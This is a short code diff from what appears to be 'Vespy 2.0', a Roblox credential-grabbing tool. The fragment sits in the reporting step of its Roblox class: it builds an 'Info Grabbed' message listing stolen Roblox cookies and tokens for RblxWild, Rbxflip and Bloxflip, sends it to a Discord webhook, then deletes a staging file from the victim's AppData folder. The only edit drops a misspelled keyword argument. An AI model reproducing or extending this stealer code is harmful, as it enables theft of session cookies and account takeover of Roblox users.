@@ -111,7 +111,7 @@ class Roblox:
         embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Vespy 2.0 | by : vesper')
         embed.set_timestamp()
-        embed.add_embed_field(name=f"Info Grabbed\n", value=f"\n:coin: RblxWild: ``{self.rblxwild} Tokens``\n\n:coin: Rbxflip: ``{self.rbxflip} Tokens``\n\n:coin: Bloxflip: ``{self.bloxflip} Tokens``\n\n:cookie: Roblox Cookie: ``{self.robloxcookies} Cookie``\n", ineline=False)
+        embed.add_embed_field(name=f"Info Grabbed\n", value=f"\n:coin: RblxWild: ``{self.rblxwild} Tokens``\n\n:coin: Rbxflip: ``{self.rbxflip} Tokens``\n\n:coin: Bloxflip: ``{self.bloxflip} Tokens``\n\n:cookie: Roblox Cookie: ``{self.robloxcookies} Cookie``\n")
         webhook.add_embed(embed)
         webhook.execute()
         os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"))
